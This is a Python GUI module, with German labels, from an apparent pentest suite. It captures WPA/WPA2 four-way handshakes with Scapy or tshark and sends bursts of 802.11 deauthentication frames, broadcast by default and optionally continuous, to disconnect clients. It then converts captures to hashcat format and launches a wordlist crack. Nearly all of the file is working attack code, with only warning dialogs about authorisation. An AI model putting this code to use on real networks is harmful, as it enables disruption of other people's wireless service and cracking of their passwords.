"""
WiFi Handshake Sniffer + Deauth – G4MEOVER Security Suite
Erfordert: Scapy, tshark/npcap, WLAN-Adapter (Monitor-Mode für Deauth)
"""
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import threading
import subprocess
import time
import os
import re
import datetime
from pathlib import Path
from modules.base import BaseModule
from utils.theme import DARK

# ─── Interface-Erkennung ──────────────────────────────────────────────────────

def _get_tshark_interfaces() -> list[tuple[str, str]]:
    """Gibt [(index, name), ...] aller tshark-Interfaces zurück."""
    try:
        out = subprocess.check_output(
            ["tshark", "-D"], stderr=subprocess.STDOUT,
            text=True, timeout=10)
    except Exception:
        return []
    result = []
    for line in out.splitlines():
        m = re.match(r"(\d+)\.\s+\\Device\\NPF_\S+\s+\((.+?)\)", line)
        if m:
            result.append((m.group(1), m.group(2)))
    return result


def _get_netsh_networks() -> list[dict]:
    """Liest verfügbare WLANs via netsh (kein Monitor-Mode nötig)."""
    try:
        out = subprocess.check_output(
            ["netsh", "wlan", "show", "networks", "mode=bssid"],
            stderr=subprocess.STDOUT, text=True,
            encoding="utf-8", errors="replace", timeout=15)
    except Exception:
        return []

    networks = []
    cur: dict = {}
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("SSID") and ":" in line and "BSSID" not in line:
            if cur:
                networks.append(cur)
            cur = {"essid": line.split(":", 1)[1].strip(), "bssid": "",
                   "channel": "", "signal": "", "clients": []}
        elif "BSSID" in line and ":" in line:
            cur["bssid"] = line.split(":", 1)[1].strip()
        elif "Kanal" in line or "Channel" in line:
            cur["channel"] = line.split(":", 1)[1].strip()
        elif "Signal" in line:
            cur["signal"] = line.split(":", 1)[1].strip()
    if cur:
        networks.append(cur)
    return networks


# ─── Scapy Handshake-Capture ──────────────────────────────────────────────────

_EAPOL_LOG: list[dict] = []
_HANDSHAKE_FRAMES: dict[str, list] = {}   # bssid → [eapol_pkts]


def _sniff_handshakes(iface_dev: str, target_bssid: str,
                      on_frame, on_handshake, stop_evt: threading.Event):
    """Scapy-basierter Sniffer: hört EAPOL-Frames und erkennt kompletten 4-way."""
    try:
        from scapy.all import sniff, Dot11, EAPOL, RadioTap
        import struct

        def pkt_cb(pkt):
            if stop_evt.is_set():
                return
            if not pkt.haslayer(EAPOL):
                return
            dot11 = pkt.getlayer(Dot11) if pkt.haslayer(Dot11) else None
            ap_mac  = (getattr(dot11, "addr3", "") or "").lower()
            sta_mac = (getattr(dot11, "addr1", "") or "").lower()
            if target_bssid and ap_mac != target_bssid.lower() and sta_mac != target_bssid.lower():
                return

            eapol_raw = bytes(pkt[EAPOL])
            # Nachrichtennummer aus Key-Info Bits
            msg_num = "?"
            if len(eapol_raw) >= 7:
                key_info = int.from_bytes(eapol_raw[5:7], "big")
                ack   = bool(key_info & 0x0080)
                mic   = bool(key_info & 0x0100)
                secure = bool(key_info & 0x0200)
                install = bool(key_info & 0x0040)
                pairwise = bool(key_info & 0x0008)
                if pairwise:
                    if ack and not mic:
                        msg_num = "1"
                    elif not ack and mic and not install:
                        msg_num = "2"
                    elif ack and mic and install:
                        msg_num = "3"
                    elif not ack and mic and secure:
                        msg_num = "4"

            key = ap_mac if ap_mac else sta_mac
            if key not in _HANDSHAKE_FRAMES:
                _HANDSHAKE_FRAMES[key] = []
            _HANDSHAKE_FRAMES[key].append(pkt)

            on_frame(ap_mac, sta_mac, msg_num)

            # Vollständiger Handshake = Nachrichten 1+2 oder 2+3
            msgs = set()
            for p in _HANDSHAKE_FRAMES[key]:
                if len(bytes(p[EAPOL])) >= 7:
                    ki = int.from_bytes(bytes(p[EAPOL])[5:7], "big")
                    ack   = bool(ki & 0x0080)
                    mic   = bool(ki & 0x0100)
                    install = bool(ki & 0x0040)
                    secure  = bool(ki & 0x0200)
                    pw = bool(ki & 0x0008)
                    if pw:
                        if ack and not mic: msgs.add(1)
                        elif not ack and mic and not install: msgs.add(2)
                        elif ack and mic and install: msgs.add(3)
                        elif not ack and mic and secure: msgs.add(4)
            if {1, 2} <= msgs or {2, 3} <= msgs:
                on_handshake(key, _HANDSHAKE_FRAMES[key])

        sniff(iface=iface_dev,
              filter="ether proto 0x888e",
              prn=pkt_cb,
              store=False,
              stop_filter=lambda _: stop_evt.is_set(),
              timeout=None)
    except Exception as e:
        on_frame("error", str(e), "!")


def _tshark_sniff(iface_num: str, target_bssid: str, outfile: str,
                  on_line, stop_evt: threading.Event):
    """tshark-basierter Sniffer (robuster, kein Monitor-Mode nötig)."""
    cmd = [
        "tshark",
        "-i", iface_num,
        "-f", "ether proto 0x888e",
        "-w", outfile,
        "-l",                       # line-buffered output
    ]
    if target_bssid:
        # Display-Filter kann tshark nicht direkt beim Capture setzen,
        # daher BSSID im Post-Processing filtern
        pass

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True, bufsize=1)
    on_line(f"[tshark] Capture läuft → {outfile}")
    for line in proc.stdout:
        if stop_evt.is_set():
            break
        on_line(line.rstrip())
    proc.terminate()
    proc.wait()


# ─── Deauth-Angriff ──────────────────────────────────────────────────────────

def _send_deauth(iface_dev: str, ap_mac: str, client_mac: str,
                 count: int, on_log):
    """
    Sendet IEEE-802.11 Deauthentication-Frames via Scapy.
    Erfordert Monitor-Mode + Packet-Injection (z.B. Alfa AWUS036).
    """
    try:
        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

        broadcast = "ff:ff:ff:ff:ff:ff"
        target = client_mac if client_mac and client_mac != broadcast else broadcast

        # Frame AP → Client
        frame_ap = (RadioTap()
                    / Dot11(addr1=target, addr2=ap_mac, addr3=ap_mac)
                    / Dot11Deauth(reason=7))

        # Frame Client → AP (nur bei gezieltem Angriff)
        frame_cli = (RadioTap()
                     / Dot11(addr1=ap_mac, addr2=target, addr3=ap_mac)
                     / Dot11Deauth(reason=7))

        on_log(f"[DEAUTH] Sende {count}x Deauth an {target} via AP {ap_mac}")

        sent = 0
        for _ in range(count):
            sendp(frame_ap,  iface=iface_dev, verbose=False)
            sendp(frame_cli, iface=iface_dev, verbose=False)
            sent += 2
            time.sleep(0.05)

        on_log(f"[DEAUTH] {sent} Frames gesendet.")
    except ImportError:
        on_log("[!] Scapy nicht verfügbar.")
    except Exception as e:
        on_log(f"[!] Deauth-Fehler: {e}")
        on_log("    Hinweis: Monitor-Mode + Packet-Injection erforderlich.")


# ─── PCAP → hc22000 ──────────────────────────────────────────────────────────

def _pcap_to_hc22000(pcap_path: str, out_path: str, on_log) -> int:
    """Konvertiert PCAP via hcxpcapngtool oder eigenem Parser."""
    # Versuch 1: hcxpcapngtool (falls installiert)
    hcx = None
    for p in [r"C:\tools\hcxtools\hcxpcapngtool.exe",
              r"C:\tools\hcxpcapngtool.exe",
              "hcxpcapngtool"]:
        try:
            subprocess.check_output([p, "--version"], stderr=subprocess.DEVNULL)
            hcx = p; break
        except Exception:
            pass

    if hcx:
        try:
            r = subprocess.run([hcx, "-o", out_path, pcap_path],
                               capture_output=True, text=True, timeout=60)
            if os.path.exists(out_path):
                count = sum(1 for l in open(out_path) if l.strip())
                on_log(f"[hcxpcapngtool] {count} Hash(es) → {out_path}")
                return count
        except Exception as e:
            on_log(f"[!] hcxpcapngtool: {e}")

    # Fallback: eigener PMKID-Extraktor aus pmkid.py
    try:
        from modules.pmkid import _extract_from_pcap, _to_hc22000
        results = _extract_from_pcap(pcap_path, on_log)
        if results:
            content = _to_hc22000(results)
            with open(out_path, "w") as f:
                f.write(content + "\n")
            on_log(f"[PMKID-Fallback] {len(results)} PMKID(s) → {out_path}")
            return len(results)
    except Exception as e:
        on_log(f"[!] Fallback-Extraktion: {e}")
    return 0


# ─── Modul-UI ─────────────────────────────────────────────────────────────────

class HandshakeModule(BaseModule):

    def _build(self):
        self._stop_evt   = threading.Event()
        self._networks:  list[dict] = []
        self._iface_map: dict[str, str] = {}   # "WLAN (4)" → "4"
        self._iface_dev_map: dict[str, str] = {}  # "WLAN (4)" → NPF-Device
        self._pcap_out   = ""
        self._selected_ap: dict = {}

        self._info_bar(self,
            "WiFi Handshake Sniffer – Fängt WPA/WPA2 4-Way-Handshakes ab. "
            "Deauth erfordert Monitor-Mode-Adapter (z.B. Alfa AWUS036).")

        paned = tk.PanedWindow(self, orient="horizontal",
                               bg=DARK["bg"], sashwidth=4)
        paned.pack(fill="both", expand=True, padx=4, pady=4)

        left  = tk.Frame(paned, bg=DARK["bg"]); paned.add(left,  minsize=310, width=350)
        right = tk.Frame(paned, bg=DARK["bg"]); paned.add(right, minsize=420)

        # ── Interface ─────────────────────────────────────────────────────────
        fi = self._section(left, "Interface")
        self._iface_var = tk.StringVar()
        self._iface_cb  = ttk.Combobox(fi, textvariable=self._iface_var,
                                        state="readonly", font=("Segoe UI", 9))
        self._iface_cb.pack(fill="x", padx=10, pady=4)
        ttk.Button(fi, text="Interfaces neu laden",
                   command=self._reload_ifaces).pack(fill="x", padx=10, pady=(0, 6))
        self._tooltip(self._iface_cb,
            "Für Monitor-Mode + Deauth: externer WLAN-Adapter benötigt\n"
            "(z.B. Alfa AWUS036ACH, TP-Link TL-WN722N v1).\n"
            "Passiver Capture läuft auch mit normalem WLAN-Adapter.")

        # ── AP-Scanner ────────────────────────────────────────────────────────
        fs = self._section(left, "Netzwerk-Scan")
        ttk.Button(fs, text="WLANs scannen (netsh)",
                   command=self._scan_networks).pack(fill="x", padx=10, pady=(4, 2))
        self._tooltip_label = tk.Label(fs,
            text="Scannt ohne Monitor-Mode via Windows WLAN-API.",
            bg=DARK["bg"], fg=DARK["border"], font=("Segoe UI", 7, "italic"))
        self._tooltip_label.pack(anchor="w", padx=10, pady=(0, 6))

        # ── Capture ───────────────────────────────────────────────────────────
        fc = self._section(left, "Handshake-Capture")
        self._target_ap_var = tk.StringVar(value="(Alle APs)")
        ta_row = tk.Frame(fc, bg=DARK["bg"]); ta_row.pack(fill="x", padx=10, pady=4)
        tk.Label(ta_row, text="Ziel-AP:", bg=DARK["bg"], fg=DARK["fg"],
                 font=("Segoe UI", 8), width=10, anchor="w").pack(side="left")
        self._target_ap_cb = ttk.Combobox(ta_row, textvariable=self._target_ap_var,
                                           font=("Segoe UI", 8))
        self._target_ap_cb.pack(side="left", fill="x", expand=True)

        out_row = tk.Frame(fc, bg=DARK["bg"]); out_row.pack(fill="x", padx=10, pady=(0, 4))
        tk.Label(out_row, text="Ausgabe:", bg=DARK["bg"], fg=DARK["fg"],
                 font=("Segoe UI", 8), width=10, anchor="w").pack(side="left")
        self._cap_out_var = tk.StringVar(value=str(
            Path(self.cfg.get("workspace", str(Path.home() / "pentest")))
            / "handshake.pcap"))
        tk.Entry(out_row, textvariable=self._cap_out_var,
                 bg=DARK["entry"], fg=DARK["fg"],
                 insertbackground=DARK["fg"], relief="flat",
                 font=("Segoe UI", 8)).pack(side="left", fill="x", expand=True, ipady=2)
        ttk.Button(out_row, text="…",
                   command=self._browse_outfile).pack(side="left", padx=(4, 0))

        self._use_scapy_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(fc, text="Scapy-Sniffer (direkter Zugriff, langsamer)",
                        variable=self._use_scapy_var).pack(anchor="w", padx=10)

        cap_btns = tk.Frame(fc, bg=DARK["bg"]); cap_btns.pack(fill="x", padx=10, pady=6)
        self._cap_btn = ttk.Button(cap_btns, text="Capture starten",
                                   style="Accent.TButton",
                                   command=self._start_capture)
        self._cap_btn.pack(side="left", fill="x", expand=True)
        self._stop_cap_btn = ttk.Button(cap_btns, text="Stoppen",
                                        style="Danger.TButton",
                                        command=self._stop_capture,
                                        state="disabled")
        self._stop_cap_btn.pack(side="left", fill="x", expand=True, padx=(4, 0))

        # ── Deauth ────────────────────────────────────────────────────────────
        fd = self._section(left, "Deauth-Angriff")
        warn = tk.Label(fd,
            text="⚠  Nur auf autorisierten Netzwerken!\n"
                 "   Benötigt Monitor-Mode + Packet-Injection.",
            bg=DARK["bg"], fg=DARK["yellow"],
            font=("Segoe UI", 7, "bold"), justify="left")
        warn.pack(anchor="w", padx=10, pady=(4, 2))

        cl_row = tk.Frame(fd, bg=DARK["bg"]); cl_row.pack(fill="x", padx=10, pady=2)
        tk.Label(cl_row, text="Client-MAC:", bg=DARK["bg"], fg=DARK["fg"],
                 font=("Segoe UI", 8), width=10, anchor="w").pack(side="left")
        self._client_mac_var = tk.StringVar(value="ff:ff:ff:ff:ff:ff")
        tk.Entry(cl_row, textvariable=self._client_mac_var,
                 bg=DARK["entry"], fg=DARK["accent"],
                 insertbackground=DARK["fg"], relief="flat",
                 font=("Consolas", 9)).pack(side="left", fill="x", expand=True, ipady=2)
        self._tooltip(cl_row,
            "ff:ff:ff:ff:ff:ff = Broadcast (trennt ALLE Clients vom AP).\n"
            "Spezifische Client-MAC: nur diesen Client trennen.")

        cnt_row = tk.Frame(fd, bg=DARK["bg"]); cnt_row.pack(fill="x", padx=10, pady=2)
        tk.Label(cnt_row, text="Pakete:", bg=DARK["bg"], fg=DARK["fg"],
                 font=("Segoe UI", 8), width=10, anchor="w").pack(side="left")
        self._deauth_count_var = tk.StringVar(value="5")
        tk.Entry(cnt_row, textvariable=self._deauth_count_var,
                 bg=DARK["entry"], fg=DARK["fg"],
                 insertbackground=DARK["fg"], relief="flat",
                 font=("Consolas", 9), width=6).pack(side="left", ipady=2)
        tk.Label(cnt_row, text="(je Burst)", bg=DARK["bg"], fg=DARK["border"],
                 font=("Segoe UI", 7, "italic")).pack(side="left", padx=4)

        self._deauth_loop_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(fd, text="Dauerhaft senden (bis Stopp)",
                        variable=self._deauth_loop_var).pack(anchor="w", padx=10)

        deauth_btns = tk.Frame(fd, bg=DARK["bg"]); deauth_btns.pack(fill="x", padx=10, pady=6)
        self._deauth_btn = ttk.Button(deauth_btns, text="Deauth senden",
                                      style="Danger.TButton",
                                      command=self._run_deauth)
        self._deauth_btn.pack(side="left", fill="x", expand=True)
        self._stop_deauth_btn = ttk.Button(deauth_btns, text="Stoppen",
                                           command=self._stop_deauth,
                                           state="disabled")
        self._stop_deauth_btn.pack(side="left", fill="x", expand=True, padx=(4, 0))

        # ── Export ────────────────────────────────────────────────────────────
        fexp = self._section(left, "Export")
        self._hc_out_var = tk.StringVar(value=str(
            Path(self.cfg.get("workspace", str(Path.home() / "pentest")))
            / "handshake.hc22000"))
        exp_row = tk.Frame(fexp, bg=DARK["bg"]); exp_row.pack(fill="x", padx=10, pady=4)
        tk.Entry(exp_row, textvariable=self._hc_out_var,
                 bg=DARK["entry"], fg=DARK["fg"],
                 insertbackground=DARK["fg"], relief="flat",
                 font=("Segoe UI", 8)).pack(side="left", fill="x", expand=True, ipady=2)
        ttk.Button(exp_row, text="…",
                   command=lambda: self._browse_save(self._hc_out_var)).pack(
            side="left", padx=(4, 0))
        ttk.Button(fexp, text="PCAP → hc22000 konvertieren",
                   command=self._convert_pcap).pack(fill="x", padx=10, pady=(0, 2))
        ttk.Button(fexp, text="In Hashcat öffnen",
                   command=self._open_hashcat).pack(fill="x", padx=10, pady=(0, 6))

        # ── Rechts: AP-Liste + Handshake-Log ─────────────────────────────────
        fap = self._section_expand(right, "Gefundene Netzwerke")
        fap.pack(fill="both", expand=False, pady=(0, 4))

        ap_cols = ("essid", "bssid", "channel", "signal", "hs")
        self._ap_tree = ttk.Treeview(fap, columns=ap_cols, show="headings",
                                      height=8, selectmode="browse")
        for col, w, label in [
            ("essid",   180, "ESSID"),
            ("bssid",   140, "BSSID"),
            ("channel",  55, "Kanal"),
            ("signal",   65, "Signal"),
            ("hs",       80, "Handshake"),
        ]:
            self._ap_tree.heading(col, text=label)
            self._ap_tree.column(col, width=w, minwidth=40)
        self._ap_tree.tag_configure("hs_ok",  foreground=DARK["green"])
        self._ap_tree.tag_configure("no_hs",  foreground=DARK["fg"])
        ap_sb = ttk.Scrollbar(fap, command=self._ap_tree.yview)
        self._ap_tree.configure(yscrollcommand=ap_sb.set)
        ap_sb.pack(side="right", fill="y")
        self._ap_tree.pack(fill="both", expand=True, padx=6, pady=4)
        self._ap_tree.bind("<<TreeviewSelect>>", self._on_ap_select)

        # Handshake-Events
        fhs = self._section_expand(right, "Capture-Log")
        fhs.pack(fill="both", expand=True)
        self._hs_tree_cols = ("time", "ap", "client", "msg", "status")
        self._hs_tree = ttk.Treeview(fhs, columns=self._hs_tree_cols,
                                      show="headings", height=6)
        for col, w, label in [
            ("time",   60,  "Zeit"),
            ("ap",    130,  "AP MAC"),
            ("client",130,  "Client MAC"),
            ("msg",    50,  "Msg"),
            ("status",100,  "Status"),
        ]:
            self._hs_tree.heading(col, text=label)
            self._hs_tree.column(col, width=w, minwidth=40)
        self._hs_tree.tag_configure("complete", foreground=DARK["green"])
        self._hs_tree.tag_configure("partial",  foreground=DARK["yellow"])
        hs_sb = ttk.Scrollbar(fhs, command=self._hs_tree.yview)
        self._hs_tree.configure(yscrollcommand=hs_sb.set)
        hs_sb.pack(side="right", fill="y")
        self._hs_tree.pack(fill="both", expand=True, padx=6, pady=4)

        self._log_out = self._log_widget(right, height=5)

        # Initial laden (verzögert, damit _status_var im Hauptfenster bereit ist)
        self.after(500, self._reload_ifaces)

    # ── Interface-Verwaltung ──────────────────────────────────────────────────

    def _reload_ifaces(self):
        ifaces = _get_tshark_interfaces()
        self._iface_map.clear()
        self._iface_dev_map.clear()
        display = []
        for num, name in ifaces:
            key = f"{name}  [{num}]"
            self._iface_map[key] = num
            display.append(key)
        self._iface_cb["values"] = display
        # WLAN bevorzugen
        for d in display:
            if "WLAN" in d or "Wi-Fi" in d or "Wireless" in d:
                self._iface_var.set(d)
                break
        else:
            if display:
                self._iface_var.set(display[0])
        self._log_line(f"[*] {len(ifaces)} Interface(s) gefunden.")

    def _get_iface_num(self) -> str:
        return self._iface_map.get(self._iface_var.get(), "")

    def _get_iface_dev(self) -> str:
        """NPF-Device-Pfad für Scapy."""
        try:
            from scapy.all import get_if_list, conf
            ifaces = get_if_list()
            num = int(self._get_iface_num()) - 1
            if 0 <= num < len(ifaces):
                return ifaces[num]
        except Exception:
            pass
        return ""

    # ── Netzwerk-Scan ─────────────────────────────────────────────────────────

    def _scan_networks(self):
        self._ap_tree.delete(*self._ap_tree.get_children())
        self._networks.clear()
        self._log_line("[*] Scanne WLANs via netsh...")

        def worker():
            nets = _get_netsh_networks()
            self.after(0, lambda: self._show_networks(nets))

        threading.Thread(target=worker, daemon=True).start()

    def _show_networks(self, nets: list[dict]):
        self._networks = nets
        ap_choices = ["(Alle APs)"]
        for n in nets:
            essid = n["essid"]
            bssid = n["bssid"]
            self._ap_tree.insert("", "end",
                                  values=(essid, bssid, n["channel"],
                                          n["signal"], "—"),
                                  tags=("no_hs",))
            if bssid:
                ap_choices.append(f"{essid}  [{bssid}]")
        self._target_ap_cb["values"] = ap_choices
        if ap_choices:
            self._target_ap_var.set(ap_choices[0])
        self._log_line(f"[+] {len(nets)} Netzwerk(e) gefunden.")

    def _on_ap_select(self, _=None):
        sel = self._ap_tree.selection()
        if not sel:
            return
        vals = self._ap_tree.item(sel[0], "values")
        if vals:
            essid, bssid = vals[0], vals[1]
            self._target_ap_var.set(f"{essid}  [{bssid}]" if bssid else essid)
            self._client_mac_var.set("ff:ff:ff:ff:ff:ff")
            self._selected_ap = {"essid": essid, "bssid": bssid}

    # ── Capture ───────────────────────────────────────────────────────────────

    def _start_capture(self):
        iface_num = self._get_iface_num()
        if not iface_num:
            messagebox.showerror("Fehler", "Interface auswählen."); return

        outfile = self._cap_out_var.get().strip()
        if not outfile:
            messagebox.showerror("Fehler", "Ausgabedatei angeben."); return
        os.makedirs(os.path.dirname(os.path.abspath(outfile)), exist_ok=True)
        self._pcap_out = outfile

        # Ziel-BSSID aus Auswahl extrahieren
        target_raw = self._target_ap_var.get()
        m = re.search(r"\[([0-9a-fA-F:]{17})\]", target_raw)
        target_bssid = m.group(1).lower() if m else ""

        self._stop_evt.clear()
        _HANDSHAKE_FRAMES.clear()
        self._cap_btn.configure(state="disabled")
        self._stop_cap_btn.configure(state="normal")
        self._log_line(f"[*] Capture auf Interface {iface_num}"
                       + (f", Ziel: {target_bssid}" if target_bssid else ", alle APs"))

        if self._use_scapy_var.get():
            iface_dev = self._get_iface_dev()
            t = threading.Thread(
                target=_sniff_handshakes,
                args=(iface_dev, target_bssid,
                      self._on_frame, self._on_handshake_complete, self._stop_evt),
                daemon=True)
        else:
            t = threading.Thread(
                target=_tshark_sniff,
                args=(iface_num, target_bssid, outfile,
                      lambda l: self.after(0, self._log_line, l), self._stop_evt),
                daemon=True)
        t.start()

    def _stop_capture(self):
        self._stop_evt.set()
        self._cap_btn.configure(state="normal")
        self._stop_cap_btn.configure(state="disabled")
        self._log_line("[*] Capture gestoppt.")
        if self._pcap_out and os.path.exists(self._pcap_out):
            sz = os.path.getsize(self._pcap_out)
            self._log_line(f"[*] PCAP: {self._pcap_out}  ({sz} Bytes)")

    def _on_frame(self, ap_mac: str, sta_mac: str, msg_num: str):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self.after(0, lambda: self._hs_tree.insert(
            "", "end",
            values=(ts, ap_mac, sta_mac, f"Msg {msg_num}", "partial"),
            tags=("partial",)))
        self.after(0, lambda: self._log_line(
            f"[EAPOL] AP={ap_mac} STA={sta_mac} Msg={msg_num}"))

    def _on_handshake_complete(self, bssid: str, frames: list):
        self._log_line(f"[✓] VOLLSTÄNDIGER HANDSHAKE: {bssid} ({len(frames)} Frames)")
        # AP-Tree aktualisieren
        for item in self._ap_tree.get_children():
            vals = self._ap_tree.item(item, "values")
            if vals and vals[1].lower() == bssid.lower():
                self._ap_tree.item(item, values=(vals[0], vals[1], vals[2],
                                                  vals[3], "✓ HS"),
                                   tags=("hs_ok",))
        # Log
        for item in self._hs_tree.get_children():
            vals = self._hs_tree.item(item, "values")
            if vals and vals[1].lower() == bssid.lower():
                self._hs_tree.item(item,
                    values=(vals[0], vals[1], vals[2], vals[3], "✓ KOMPLETT"),
                    tags=("complete",))

        # PCAP speichern
        if self._use_scapy_var.get():
            try:
                from scapy.all import wrpcap
                ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                out = self._cap_out_var.get().replace(".pcap", f"_{bssid.replace(':','')}.pcap")
                wrpcap(out, frames)
                self._log_line(f"[*] PCAP gespeichert: {out}")
                self._pcap_out = out
            except Exception as e:
                self._log_line(f"[!] PCAP-Speichern: {e}")

    # ── Deauth ────────────────────────────────────────────────────────────────

    def _run_deauth(self):
        target_raw = self._target_ap_var.get()
        m = re.search(r"\[([0-9a-fA-F:]{17})\]", target_raw)
        if not m:
            messagebox.showerror("Fehler",
                "Bitte zuerst einen AP scannen und auswählen.\n"
                "Ziel-AP muss eine BSSID enthalten."); return

        ap_mac = m.group(1).lower()
        client_mac = self._client_mac_var.get().strip().lower()
        iface_dev  = self._get_iface_dev()

        if not messagebox.askyesno(
            "⚠ Deauth-Angriff",
            f"Deauth-Frames an AP senden?\n\n"
            f"AP:     {ap_mac}\n"
            f"Client: {client_mac}\n\n"
            "ACHTUNG: Nur auf Netzwerken verwenden, für die\n"
            "ausdrückliche schriftliche Genehmigung vorliegt!\n\n"
            "Fortfahren?",
            icon="warning"):
            return

        count = int(self._deauth_count_var.get() or "5")
        loop  = self._deauth_loop_var.get()

        self._deauth_btn.configure(state="disabled")
        self._stop_deauth_btn.configure(state="normal")
        self._deauth_stop = threading.Event()

        def worker():
            if loop:
                burst = 0
                while not self._deauth_stop.is_set():
                    _send_deauth(iface_dev, ap_mac, client_mac, count,
                                 lambda l: self.after(0, self._log_line, l))
                    burst += 1
                    self.after(0, self._log_line,
                               f"[DEAUTH] Burst #{burst} gesendet. Warte 2s...")
                    time.sleep(2)
            else:
                _send_deauth(iface_dev, ap_mac, client_mac, count,
                             lambda l: self.after(0, self._log_line, l))
            self.after(0, lambda: self._deauth_btn.configure(state="normal"))
            self.after(0, lambda: self._stop_deauth_btn.configure(state="disabled"))

        threading.Thread(target=worker, daemon=True).start()

    def _stop_deauth(self):
        if hasattr(self, "_deauth_stop"):
            self._deauth_stop.set()
        self._deauth_btn.configure(state="normal")
        self._stop_deauth_btn.configure(state="disabled")
        self._log_line("[*] Deauth gestoppt.")

    # ── Export ────────────────────────────────────────────────────────────────

    def _convert_pcap(self):
        pcap = self._pcap_out or self._cap_out_var.get().strip()
        if not pcap or not os.path.exists(pcap):
            messagebox.showerror("Fehler",
                "Keine PCAP-Datei vorhanden.\nErst Capture starten."); return
        out = self._hc_out_var.get().strip()
        if not out:
            return
        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
        threading.Thread(
            target=lambda: _pcap_to_hc22000(
                pcap, out, lambda l: self.after(0, self._log_line, l)),
            daemon=True).start()

    def _open_hashcat(self):
        hc_file = self._hc_out_var.get().strip()
        if not hc_file or not os.path.exists(hc_file):
            self._convert_pcap()
            return
        hashcat = self._tool_path("hashcat")
        if not hashcat:
            messagebox.showwarning("Hashcat",
                "hashcat nicht gefunden.\nPfad in Einstellungen setzen."); return
        cmd = f'start cmd /k "{hashcat}" -m 22000 "{hc_file}" -a 0 wordlist.txt'
        subprocess.Popen(cmd, shell=True)
        self._log_line(f"[*] hashcat gestartet: {hc_file}")

    # ── Hilfs-Methoden ────────────────────────────────────────────────────────

    def _browse_outfile(self):
        p = filedialog.asksaveasfilename(
            title="PCAP-Ausgabe",
            defaultextension=".pcap",
            filetypes=[("PCAP", "*.pcap *.pcapng"), ("Alle", "*.*")])
        if p:
            self._cap_out_var.set(p)

    def _browse_save(self, var: tk.StringVar):
        p = filedialog.asksaveasfilename(
            title="hc22000-Ausgabe",
            defaultextension=".hc22000",
            filetypes=[("Hashcat 22000", "*.hc22000"), ("Alle", "*.*")])
        if p:
            var.set(p)

    def _log_line(self, text: str):
        self._log_out.configure(state="normal")
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        self._log_out.insert("end", f"[{ts}] {text}\n")
        self._log_out.see("end")
        self._log_out.configure(state="disabled")
        if self._activity_cb:
            self._activity_cb(f"Handshake: {text[:80]}")
